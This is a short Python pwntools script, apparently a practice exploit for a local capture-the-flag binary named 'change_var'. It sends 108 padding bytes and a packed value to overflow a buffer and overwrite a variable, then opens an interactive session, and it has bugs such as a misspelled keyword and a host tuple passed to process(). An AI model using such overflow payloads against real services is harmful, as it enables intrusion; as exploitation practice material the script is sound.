from pwn import *
#p = process("/home/robin/Pwn/0x01/change_var", verbrose=False)

#p.pause()
#p.vmmap()
p = process(("localhost", 10001), verbrose=True, debug=sys.stdout)
payload = b"A"*108 + p32(0x32)
p.recvline()
p.sendline(payload)
p.interact()
